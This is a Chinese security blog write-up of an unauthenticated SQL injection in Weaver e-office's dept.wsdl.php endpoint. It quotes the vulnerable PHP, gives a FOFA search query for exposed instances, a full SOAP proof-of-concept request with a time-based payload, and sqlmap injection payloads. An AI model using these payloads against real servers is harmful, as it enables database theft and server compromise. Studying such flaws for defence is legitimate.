---
title: "泛微e-office dept.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html
asset_dir: assets/泛微e-office-dept.wsdl.php-sql注入漏洞
---

# 泛微e-office dept.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/20 18:26
- 791浏览
- [0评论](#comment)
- 39分钟阅读

深入探索

Web服务

office

软件

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office dept.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

[![泛微e-office dept.wsdl.php sql注入漏洞](images/img-001-09cdf05b0ca7.webp)](https://image.mrxn.net/e7c35cc50b3a42cf8bd507415cac8b35.webp)

[webservice](#)-json/dept/dept.wsdl.php 的 `DeleteDept` 业务逻辑如下

编程

```
function DeleteDept( $DeptId )
{
    checkcurrentsession( );
    $Dept = new department( );
    $insertResult = $Dept->deleteDept( $DeptId );
    return $insertResult;
}
```

深入探索

安全认证考试

Windows安全工具

授权

`$DeptId` 首先带入 `deleteDept` 函数

```
public function deleteDept( $deptid )
    {
        global $connection;
        if ( $deptid == "" )
        {
            return false;
        }
        if ( !$this->checkDeptNoUser( $deptid ) )
        {
            return false;
        }
        $sql = "DELETE FROM department WHERE DEPT_ID='".$deptid."'";
        exequery( $connection, $sql );
        return true;
    }
```

深入探索

编码转换工具

网络安全培训

云安全解决方案

又首先进入 `checkDeptNoUser` 函数

```
public function checkDeptNoUser( $deptid )
    {
        global $connection;
        if ( $deptid == "" )
        {
            return false;
        }
        $sql = "SELECT COUNT(*) AS cnt FROM USER WHERE DEPT_ID='".$deptid."'";
        $rs = exequery( $connection, $sql );
        $row = mysql_fetch_array( $rs );
        if ( 0 < $row['cnt'] )
        {
            return false;
        }
        return true;
    }
```

`$deptid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/dept/dept.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:DepartmentServicewsdl#DeleteDept
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 460

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' AND 2462=BENCHMARK(5000000,MD5(0x65486473))-- rXUd</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office dept.wsdl.php sql注入漏洞](images/img-002-0765f5b3e89d.webp)](https://image.mrxn.net/a0a80da311b64fe4b87fe016aba5eddd.webp)

成功在延时 10 秒（因为先进入 checkDeptNoUser 函数再执行deleteDept的select语句，总共执行两次）

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 418 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' RLIKE (SELECT (CASE WHEN (6681=6681) THEN 0x6765726f ELSE 0x28 END))-- IpLL</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' AND 2462=BENCHMARK(5000000,MD5(0x65486473))-- rXUd</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

网络安全
